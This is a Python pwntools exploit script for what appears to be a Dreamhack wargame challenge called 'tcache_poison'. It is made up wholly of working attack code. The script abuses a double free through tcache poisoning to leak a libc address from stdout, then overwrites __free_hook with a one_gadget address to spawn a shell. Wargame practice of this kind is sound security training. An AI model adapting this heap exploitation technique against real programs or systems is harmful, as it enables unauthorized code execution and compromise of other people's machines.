from pwn import *

p=remote("host1.dreamhack.games",15221)
e= ELF('./tcache_poison')
libc = ELF('./libc-2.27.so')
def alloc(size, data):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b':',str(size).encode())
    p.sendafter(b':', data)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_chunk():
    p.sendlineafter(b'Edit\n',b'3')

def edit(data):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b':', data)

alloc(0x30, b'dreamhack')
free()

edit(b'B'*8 + b'\x00')
free()

addr_stdout = e.symbols['stdout']
alloc(0x30, p64(addr_stdout))

alloc(0x30, b'BBBBBBBB')

_io_2_1_stdout_lsb = p64(libc.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb)

print_chunk()
p.recvuntil('Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - libc.symbols['_IO_2_1_stdout_']
fh = lb + libc.symbols['__free_hook']
og = lb + 0x4f432

alloc(0x40, b'dreamhack')
free()

edit(b'C'*8 + b'\x00')
free()

alloc(0x40,p64(fh))

alloc(0x40,b'D'*8)

alloc(0x40,p64(og))

free()

p.interactive()

